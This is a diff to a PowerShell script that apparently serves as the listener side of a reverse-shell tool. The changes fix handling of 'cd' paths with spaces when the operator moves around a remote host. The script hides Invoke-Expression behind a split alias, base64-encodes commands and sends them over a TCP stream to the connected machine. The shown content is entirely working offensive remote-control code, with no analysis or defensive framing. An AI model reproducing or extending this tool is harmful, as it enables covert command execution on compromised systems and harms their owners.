@@ -48,6 +48,7 @@ $Port = $args[2]
 $Start = "True"
 $Chunk = $args[4]
 $DataCount = 1
+$remotepath = $home
 $Alias1 = "Invoke" ; $Alias2 = "Express"
 Set-Alias sh -value "$Alias1-$Alias2`ion"
 if ($OSVersion -like "*Win*") { $localslash = "\" } else { $localslash = "/" } 
@@ -122,16 +123,17 @@ if ($command -like "cls") { Clear-Host ; $command = $null }
 if ($command -like "clear") { Clear-Host ; $command = $null }
 if ($command -like "cd .") { $path = $path ; $command = $null }
 if ($command -like "cd ..") { $path = Split-Path $path ; $command = "Set-Location $path" ; Write-Host }
-if ($command -like "cd*") { $remotepath = $command.split()[1] ; Write-Host
-if ($command -like "*$remoteslash*") { $command = "Set-Location $remotepath" ; $path = $remotepath }
+if ($command -like "cd*") { $remotepath = $command.split()[1..99] -join ' ' ; Write-Host
+if ($command -like "*$remoteslash*") { $command = "Set-Location `'$remotepath`'" ; $path = $remotepath }
 
-else { $path = $path + $remoteslash + $command.split()[1] ; $command = "Set-Location $path" }}
+else { $path = $path + $remoteslash + $command.split()[1..99] -join ' ' ; $command = "Set-Location `'$path`'" }}
 if ($OSVersion -like "*Win*") { if ($remoteslash -eq "/") { $path = $path.replace("\","/") }}
 if ($OSVersion -notlike "*Win*") { if ($remoteslash -eq "\") { $path = $path.replace("/","\") }}
 if ($command -eq "exit") { $PSexit = "True" } ; if ($command -eq $null) { Write-Host }}
 
 until ($command -ne $null) ; if ($command) { $command = R64Encoder -t $command }}
 if ($args -like "*-debug") { Write-Host "CMD: $command" }
+$remotepath = $remotepath.replace("'","").replace('"','')
 
 $stream.Write([text.Encoding]::Ascii.GetBytes($command), 0, $command.Length)
 $client.Close() ; $Listener.Stop()
